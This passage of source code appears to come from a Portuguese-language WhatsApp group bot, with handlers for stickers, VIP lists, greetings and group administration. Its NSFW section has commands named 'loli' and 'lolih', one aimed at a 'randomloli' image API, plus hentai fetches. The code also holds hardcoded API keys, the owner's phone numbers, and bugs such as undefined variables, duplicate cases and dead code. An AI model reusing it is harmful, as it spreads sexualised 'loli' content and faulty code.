mentions(`${sus}`, mentioned, true)
break
case 'cst':
                
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
const media = await tomioka.downloadAndSaveMediaMessage(encmedia)                                     
rano = getRandom('.webp')
await ffmpeg(`./${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
exec(`webpmux -set exif ${addMetadata('TOMIOKABOT', '554498220867')} ${rano} -o ${rano}`, async (error) => {
fs.unlinkSync(media)
enviar(mess.wait())
})
})
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer1 = fs.readFileSync(rano)
tomioka.sendMessage(from, buffer1, sticker, {quoted: tomio})
fs.unlinkSync(rano)
})
} else if ((isMedia && msg.message.videoMessage.seconds < 11 || isQuotedVideo && msg.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
const media = await tomioka.downloadAndSaveMediaMessage(encmedia)
rano = getRandom('.webp')
enviar('‚ù¨‚ùó‚ù≠ Espera mano')
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
exec(`webpmux -set exif ${addMetadata('TOMIOKABOT', '5544988116479')} ${rano} -o ${rano}`, async (error) => {
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
enviar(`Falha na convers√£o de ${tipe} para sticker`)
})
})
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 200:200 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer2 = fs.readFileSync(rano)
tomioka.sendMessage(from, buffer2, sticker, {quoted: tomio})
fs.unlinkSync(rano)
})
} else {
enviar(`Voc√™ precisa enviar ou marcar uma imagem ou v√≠deo com no m√°ximo 10 segundos`)
}
break
case 'autofigu':						   
if (!isGroup) return enviar(`SOMENTE EM GRUPOS`)
if (!isGroupAdmins) return enviar(`VOC√ä N√ÉO E ADMINISTRADOR DO GRUPO`)
if (args.length < 1) return enviar('1 para ativar ou 0 para desativar')
if (Number(args[0]) === 1) {
if (isAutofigu) return enviar('*[‚ùó] ja esta ativado* !!!')
autofigu.push(from)
fs.writeFileSync('./database/group/autofigu.json', JSON.stringify(autofigu))
enviar('*‚ù¨ ‚úÖ ‚ù≠ auto-figu ativado com sucesso neste grupo...*')
enviar('*Atencao a todos os membros ativos deste grupo o auto-figu esta ativado se voc√™ enviar alguma foto ou video, o bot ira fazer automaticamente uma figurinha*')
} else if (Number(args[0]) === 0) {
autofigu.splice(from, 1)
fs.writeFileSync('./database/group/autofigu.json', JSON.stringify(autofigu))
enviar('*‚ù¨ ‚ùå ‚ù≠ modo auto-figurinha desativado com sucesso neste grupo...*')
} else {
enviar(`*Use assim : 1 para ativar ou 0 para desativar*`)
}
break
///FIGURINHA TERMUX///
 case 'stiker':
case 'sticker':
case 'stickergif':
case 'stikergif':
case 'fig':
case 'gif':
case 'figura':
case 'figu':
case 'figurinha':
case 'f':
case 's':
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
const media = await tomioka.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.webp')
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
await ffmpeg(`./${media}`)
.input(media)
.on('start', function(cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function(err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
enviar('erro')
})
.on('end', function() {

exec(`webpmux -set exif ${addMetadata('TIOTOMIOKA', '(44) 98220867')} ${ran} -o ${ran}`, async(error) => {
if (error) return enviar('erro')
tomioka.sendMessage(from, fs.readFileSync(ran), sticker, {
contextInfo: null, quoted: tomio, contextInfo: tome
})
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(200,iw)':min'(200,ih)':force_original_aspect_ratio=decrease,fps=15, pad=200:200:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia && msg.message.videoMessage.seconds < 11 || isQuotedVideo && msg.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
const media = await tomioka.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.webp')
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function(cmd) {

})
.on('error', function(err) {

fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
enviar('erro')
})
.on('end', function() {


exec(`webpmux -set exif ${addMetadata('TIOTOMIOKA', '(44) 98220867')} ${ran} -o ${ran}`, async(error) => {
if (error) return enviar('erro')
tomioka.sendMessage(from, fs.readFileSync(ran), sticker, {contextInfo: null, quoted: tomio, contextInfo: tome})
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(200,iw)':min'(200,ih)':force_original_aspect_ratio=decrease,fps=15, pad=200:200:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else {
enviar(`Primeiro vc precisa enviar a imagem, video ou gif de at√© 9 segundos, ai vc comenta com ${prefix}f`)
}
break
case 'dado':    
kapankah = body.slice(1)
const elu =['1','2','3','4','5','6']
const ule = elu[Math.floor(Math.random() * elu.length)]
tomioka.sendMessage(from, ule, text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case 'clearvp':
if (!isGroup) return enviar ('s√≥ grupo')
if (!isOwner) return enviar ('*Este comando s√≥ pode ser usado pelo o dono!* ')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return 
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
premium.splice(`${mentioned}`)
fs.writeFileSync('./database/vip.json', JSON.stringify(premium))
vip = `‚ùéLista vip limpa com sucesso‚ùé`
mentions(`${vip}`, mentioned, true)   
break
case 'addvip':
if (!isGroup) return enviar ('s√≥ grupo')
if (!isOwner) return enviar ('*Este comando s√≥ pode ser usado pelo o dono!* ')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return 
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
premium.push(`${mentioned}`)
fs.writeFileSync('./database/vip.json', JSON.stringify(premium))
vip = `‚úÖ@${mentioned[0].split('@')[0]} Voc√™ virou Vip no TOMIOKA BOT‚úÖ`
mentions(`${vip}`, mentioned, true)   
break

case 'delvip':
if (!isGroup) return enviar ('s√≥ grupo')
if (!isOwner) return enviar ('*Este comando s√≥ pode ser usado pelo o dono!* ')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return 
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
premium.splice(`${mentioned}`)
fs.writeFileSync('./database/vip.json', JSON.stringify(premium))
vip = `‚ùé@${mentioned[0].split('@')[0]} Voc√™ deixou de ser um membro Vip do TOMIOKA BOT‚ùé`
mentions(`${vip}`, mentioned, true)   
break
case 'daftarvip': 
tomioka.sendMessage(from, daftarvip(prefix) , text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case 'nekopoi':   

tomioka.sendMessage(from, nekopoi(prefix) , text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case 'cekvip': 
if (!isPremium) return enviar ('s√≥ premium')
me = tomioka.user
uptime = process.uptime()
tomioka.sendMessage(from,  `*‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ*\n*NOME DO BOT:* ÍßÅùïãùïÜùïÑùïÄùïÜùïÇùî∏~ùîπùïÜùïãÍßÇ\n*‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ*\n„Äé *ùêïùêàùêè ùêîùêíùêÑùêë*„Äè\n*‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ*\n*‚Ä¢N√öMERO:* *${sender.split("@s.whatsapp.net")[0]}*\n*‚Ä¢STATUS:* *ATIVO*\n*‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ*\n*STATUS BOT:* *${kyun(uptime)}*\n\n*VOCE √â UM MEMBRO PREMIUMüòç* \n*‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ*` , text, { quoted: msg, })
break 
case 'bomdia':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
memein = await kagApi.memeindo()
buffer = await getBuffer(`https://i.imgur.com/7VL9cFf.jpg`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: 'Bom dia, vcs sao fodas ‚ù§Ô∏è'})
break
case 'boatarde':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
memein = await kagApi.memeindo()
buffer = await getBuffer(`https://i.imgur.com/JaO3yoV.jpg`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: 'Boa tarde, rapeize üòéüëç'})
break
case 'hearth':      
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(7)
if (teks.length > 10) return enviar ('O texto √© longo, at√© 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ‚úì*')
buffer = await getBuffer(`https://hadi-api.herokuapp.com/api/photoxy/wood-hearth?teks=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'tai'})
break
case 'boanoite':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
memein = await kagApi.memeindo()
buffer = await getBuffer(`https://i.imgur.com/yOFxSUR.jpg`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: 'Boa noite fml ‚ù§Ô∏è'})
break
case 'lofi':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
memein = await kagApi.memeindo()
buffer = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTL9hZBPRo16fIhsIus3t1je2oAU23pQqBpfw&usqp=CAU`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: 'Ô∏èüíÜ'})
break
case 'malkova':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
memein = await kagApi.memeindo()
buffer = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQtbo5EcVSGj-IvEVznHIgMZ9vjFptZfvprtg&usqp=CAU`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: 'Ô∏èüíÜ'})
break
case 'canal':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
buffer = await getBuffer(`https://rbacelia.sirv.com/IMG-20210624-WA0373.jpg`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption:'*canal do Tomioka:*\n\n https://youtube.com/channel/UC8DcGKSSBm7kv2lXsjAmmMQ', quoted: msg} )
break
//_COMANDOS NSFW
case 'loli':

enviar('*„Äå ‚ùó „Äç Aguarde um pouco amigo, a procura da imagem...*')
anu = await axios.get('https://nekos.life/api/v2/img/neko')
loliz = await getBuffer(anu.data.url)
tomioka.sendMessage(from, loliz, image, {quoted: tomio, contextInfo: tome,contextInfo: null, caption: 'rum'})
break
case 'loli2':

enviar('*„Äå ‚ùó „Äç Aguarde um pouco amigo, a procura da imagem...*')
anu = await axios.get('https://nekos.life/api/v2/img/fox_girl')
loliz = await getBuffer(anu.data.url)
tomioka.sendMessage(from, loliz, image, {quoted: tomio, contextInfo: tome,contextInfo: null, caption: 'rum'})
break
case 'neko':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)

memein = await kagApi.memeindo()
buffer = await getBuffer(`http://brizas-api.herokuapp.com/random/hentai/eroneko?apikey=brizaloka`)
tomioka.sendMessage(from, buffer, image, {quoted: tomio, contextInfo: tome, contextInfo: null, caption: 'RumÔ∏è'})
break
case 'hentai':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)

buffer = await getBuffer(`http://brizas-api.herokuapp.com/random/hentai/classic?apikey=brizaloka`)
tomioka.sendMessage(from, buffer, image, {quoted: tomio, contextInfo: tome, contextInfo: null, caption: 'rum'})
break
case 'boanoite':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
memein = await kagApi.memeindo()
buffer = await getBuffer(`https://imgur.com/gallery/4HeRfuO`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: 'boa noite ‚ù§Ô∏è'})
break
case 'bomdia':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
memein = await kagApi.memeindo()
buffer = await getBuffer(`https://imgur.com/gallery/zFvzl2S`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: 'bom dia ‚ù§Ô∏è'})
break
case 'termux':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
meme = await kagApi.memes()
buffer = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTgADDq_64EbTI0NroP7CUoVeWmu1J06NnGHw&usqp=CAU`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: 'Terminal √© um programa muito conhecido no mundo das distribui√ß√µes¬†Linux. Ele √© uma ferramenta que facilita muito nas tarefas relacionadas ao sistema. Agora, j√° pensou em¬†utilizar o¬†Terminal Linux¬†no seu¬†Android? Esta √© a proposta do¬†Termux.\n\n*TERMUX: UTILIZE O TERMINAL NO SEU ANDROID*\n\nA utiliza√ß√£o do Terminal¬†aumenta muito a produtividade¬†do usu√°rio que j√° possui um determinado n√≠vel de conhecimento t√©cnico.\nCom o terminal, √© poss√≠vel fazer diversas e diferentes coisas, desde navegar entre os diret√≥rios e instalar programas, at√© descompactar arquivos e monitorar os processos.'})
break
case 'grupoinfo':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.updatePresence(from, Presence.composing)
if (!isGroup) return enviar ('s√≥ grupo')
ppUrl = await tomioka.getProfilePicture(from) // leave empty to get your own
buffer = await getBuffer(ppUrl)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: `*NOME* : ${groupName}\n*MEMBRO* : ${groupMembers.length}\n*ADMIN* : ${groupAdmins.length}\n*DESCRI√á√ÉO* : ${groupDesc}`})
break
case 'meme':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
anu = await fetchJson(`https://imgur.com/gallery/rvz2dPi`, {method: 'get'})
ri = JSON.parse(JSON.stringify(anu));
ze =  ri[Math.floor(Math.random() * ri.length)];
nye = await getBuffer(ze)
tomioka.sendMessage(from, nye, image, { caption: 'cringeÔ∏è', contextInfo: null, quoted: tomio, contextInfo: tome})

break
case 'rr':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
rate = body.slice(1)
ratee = ["Tac... N√£o disparou","Tac... N√£o disparou,ainda...","Tacüí• Disparou e voc√™ morreu","Tacüí•Disparou mas a bala pegou de rasp√£o","A arma falhou","Tac... Por pouco que n√£o dispara...","Tac... A arma estava descarregada"]
const cu = ratee[Math.floor(Math.random() * ratee.length)]
tomioka.sendMessage(from, ''+ cu+'', text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case 'bug':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
const bug = body.slice(5)
if (args.length > 300) return tomioka.sendMessage(from, 'M√°ximo 300 caracteres', msgType.text, {quoted: msg})
var nomor = msg.participant
teks1 = `[REPORT]\nDe: wa.me/${sender.split("@s.whatsapp.net")[0]}\nErro ou bug: ${bug}`
var options = {
text: teks1, 
contextInfo: {mentionedJid: [sender]}, 
}
tomioka.sendMessage('554498220867@s.whatsapp.net', options, text, {quoted: msg})
enviar("Mensagem enviada ao meu dono; Spam = block + ban.")
break
case 'enviar':
if (isBanned) return enviar ('Desculpe, voc√™ foi pego!')
if (args.length < 1) return enviar (`O que voc√™ deseja solicitar? Exemplo: ${prefix}request fitur anime`)

const cfrr = body.slice(7)
if (cfrr.length > 300) return tomioka.sendMessage(from, text , 'Desculpe, o texto √© muito longo, m√°ximo de 300 textos')
const ress = `*[ùô®ùô™ùôúùôöùô®ùô©ùôñÃÉùô§/ùôóùô™ùôú]*\nN√∫mero : @${tonor.split("@s.whatsapp.net")[0]}\nPesan : ${cfrr}`

var options = {
text: ress,
contextInfo: {mentionedJid: [tonor]},
}
tomioka.sendMessage('554498220867@s.whatsapp.net', options, text, {quoted: msg})
enviar('SUA SOLICITA√á√ÉO ATINGEU O propriet√°rio do BOT, Solicita√ß√µes pals /main2 n√£o ser√£o respondidas. ')
break
case 'dono':
tomioka.sendMessage(from, {displayname: "TOMIOKA", vcard: vcard}, MessageType.contact, { quoted: tomio, contextInfo: tome})    
enviar (`*Caso esteja de whatsapp imune*\n\n*Segue o Wame do meu dono..*\n\n*Wa.me/5544998220867*`)
break
case 'setprefix':
if (!isOwner) return 
enviar(`*Qual o tipo de prefixo vc deseja?*

mensione a mensagem com a op√ß√£o que deseja_

_- [Multi] Se deseja MultiPrefix_
_- [NoPref] se n√£o deseja Prefix_
_- [Custom] escreva o novo prefix que deseja usar_
_- [Rest] devolver ao prefix principal_`)
break
case 'lolih':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
gatauda = body.slice(6)
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
anu = await fetchJson(`https://tobz-api.herokuapp.com/api/randomloli?apikey=BotWeA`, {method: 'get'})
buffer = await getBuffer(anu.result)
tomioka.sendMessage(from, buffer, image, {quoted: msg})

break
case 'marcar':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('s√≥ grupo')
if (!isGroupAdmins) return enviar ('s√≥ adm')
members_id = []
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += '\n\n'
for (let mem of groupMembers) {
teks += `*#* @${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
mentions(teks, members_id, true)
break
case 'marcar2':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
members_id = []
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += '\n\n'
for (let mem of groupMembers) {
teks += `‚ï†‚û• @${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
enviar(teks)
break
case 'marcar3':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
members_id = []
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += '\n\n'
for (let mem of groupMembers) {
teks += `‚ï†‚û• https://wa.me/${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
tomioka.sendMessage(from, teks, text, {detectLinks: false, quoted: msg})
break
case 'marcar4':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
members_id = []
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += '\n\n'
for (let mem of groupMembers) {
teks += `‚ï†‚û• ${mem.jid.split('@')[0]}@s.whatsapp.net\n`
members_id.push(mem.jid)
}
tomioka.sendMessage(from, teks, text, {detectLinks: false, quoted: msg})
break
///_PROMOVER E REBAIXAR MARCANDO @
/*   case 'promover':
if (!isGroup) return enviar ('s√≥ grupo')
if (!isGroupAdmins) return enviar ('s√≥ adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Promovido com sucesso\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(from, mentioned, true)
tomioka.groupRemove(from, mentioned)
} else {
mentions(`Promovido com sucesso @${mentioned[0].split('@')[0]} Como administrador do grupo!`, mentioned, true)
tomioka.groupMakeAdmin(from, mentioned)
}
break
case 'rebaixar':
if (!isGroup) return enviar ('s√≥ grupo')
if (!isGroupAdmins) return enviar ('s√≥ adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Rebaixado com sucesso\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
tomioka.groupRemove(from, mentioned)
} else {
mentions(`Voce foi rebaixado @${mentioned[0].split('@')[0]} Agora voc√™ √© s√≥ mais um membro comum!`, mentioned, true)
tomioka.groupDemoteAdmin(from, mentioned)
}
break */
///_PROMOVER E REBAIXAR MARCANDO MSG
case 'rebaixar': 
if (!isGroup) return enviar ('s√≥ grupo')
if (!isGroupAdmins) return enviar ('s√≥ adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
if (msg.message.extendedTextMessage === null || msg.message.extendedTextMessage === undefined) return;
if (msg.message.extendedTextMessage.contextInfo.participant === undefined) {
entah = msg.message.extendedTextMessage.contextInfo.mentionedJid
if (exe1.groupadmins> 1) {
var M_exe = []
for (let cut of exe1) {
M_exe.push(cut)
}
tomioka.groupDemoteAdmin(from, M_exe)
} else {
tomioka.groupDemoteAdmin(from, [exe1[0]])
}
} else {
exe1 = msg.message.extendedTextMessage.contextInfo.participant
tomioka.groupDemoteAdmin(from, [exe1])
}
enviar("ok, chefe esse cara perdeu o adm!")
break

case 'promover': 
if (!isGroup) return enviar ('s√≥ grupo')
if (!isGroupAdmins) return enviar ('s√≥ adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
if (msg.message.extendedTextMessage === null || msg.message.extendedTextMessage === undefined) return;
if (msg.message.extendedTextMessage.contextInfo.participant === undefined) {
entah = msg.message.extendedTextMessage.contextInfo.mentionedJid
if (exe1.groupadmins> 1) {
var M_exe = []
for (let cut of exe1) {
M_exe.push(cut)
}
tomioka.groupMakeAdmin(from, M_exe)
} else {
tomioka.groupMakeAdmin(from, [exe1[0]])
}
} else {
exe1 = msg.message.extendedTextMessage.contextInfo.participant
tomioka.groupMakeAdmin(from, [exe1])
}
enviar("ok, chefe esse cara agora e admin!")
break
case 'morte':
case 'death':
idde = ["30","76","90","72","83","73","83","74","92","100","94","48","37","53","63"]
idade = idde[Math.floor(Math.random() * (idde.length))]
morte = `Pessoas com este nome: ${pushname} \nTendem a morrer aos ${idade} anos de idade.`
enviar(morte)
break
case 'busc':
if(!isGroup)return enviar('s√≥ grupo')
if(!q) return enviar('O que voc√™ est√° procurando no YouTube?')
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
datai = [];
try{
ysearch = await yts(q)
hdata = ysearch.all
}catch(e){
return enviar('erro')
}
num = 1
for(let i=0; i<hdata.length; i++){
datai.push({
"rows": [
{
"title": "#M",
description: `Title: ${hdata[i].title}\n\nUploader: ${hdata[i].author.name}`,
"rowId": hdata[i].url
},
{
"title": "#MP4",
description: `Title: ${hdata[i].title}\n\nUploader: ${hdata[i].author.name}`,
"rowId": hdata[i].url
}
], title: num})
num += 1
}
po = tomioka.prepareMessageFromContent(from, {
"listMessage":{
"title": "*YOUTUBE DOWNLOAD*",
"description": `Mandado por : ${pushname}\n*Resultado da pesquisa : ${q}*\n*Baixe clicando no bot√£o abaixo*`,
"buttonText": "Result",
"listType": "SINGLE_SELECT",
"sections": datai}}, {}) 
tomioka.relayWAMessage(po, {waitForAck: true})
break
case 'sugerir':
if (args.length < 1) return enviar (`Oque voc√™ quer sugerir para meu criador?`)
const psn = body.slice(8)
var nmr = msg.participant
const tks1 = `[SUGEST√ÉO]\nN√∫mero : wa.me/${nmr.split('@s.whatsapp.net')[0]}\nMensagem : ${psn}`
var options = {
text: tks1,
contextInfo: {mentionedJid: [nmr]},
}
tomioka.sendMessage(`554498220867@s.whatsapp.net`, options, text, {quoted: tomio, contextInfo: tome})
enviar(`A sugest√£o foi relatada para meu criador, obrigado ${pushname}`)
break
/*case 'add':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('s√≥ grupo')
if (!isGroupAdmins) return enviar ('s√≥ adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
if (args.length < 1) return enviar ('Voc√™ quer adicionar? usa certo trem ')
if (args[0].startsWith('08')) return enviar ('Use o c√≥digo do pa√≠s, man')
try {
num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
tomioka.groupAdd(from, [num])
} catch (e) {
console.log('Error :', e)
enviar('Falha ao adicionar destino, talvez porque √© privado')
}
break*/
case 'kik': 

if (!isGroupAdmins) return enviar ('s√≥ adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
if (msg.message.extendedTextMessage === null || msg.message.extendedTextMessage === undefined) return;
if (msg.message.extendedTextMessage.contextInfo.participant === undefined) {
entah = msg.message.extendedTextMessage.contextInfo.mentionedJid
if (exe1.groupadmins> 1) {
var M_exe = []
for (let cut of exe1) {
M_exe.push(cut)
}
tomioka.groupRemove(from, M_exe)
} else {
tomioka.groupRemove(from, [exe1[0]])
}
} else {
exe1 = msg.message.extendedTextMessage.contextInfo.participant
tomioka.groupRemove(from, [exe1])
}
tomioka.sendMessage("Alvo removido com sucesso")
break 
case 'banir':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('s√≥ grupo')
if (!isGroupAdmins) return enviar ('s√≥ adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return enviar ('A marca-alvo que voc√™ quer chutar!')
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Alvo removido com sucesso :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
tomioka.groupRemove(from, mentioned)
} else {
mentions(`Alvo removido com sucesso  : @${mentioned[0].split('@')[0]}`, mentioned, true)
tomioka.groupRemove(from, mentioned)
}
break
case 'admins':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('s√≥ grupo')
teks = `Lista de admins do grupo *${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
no = 0
for (let admon of groupAdmins) {
no += 1
teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
}
mentions(teks, groupAdmins, true)
break
case 'linkgp':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('s√≥ grupo')
if (!isGroupAdmins) return enviar ('s√≥ adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
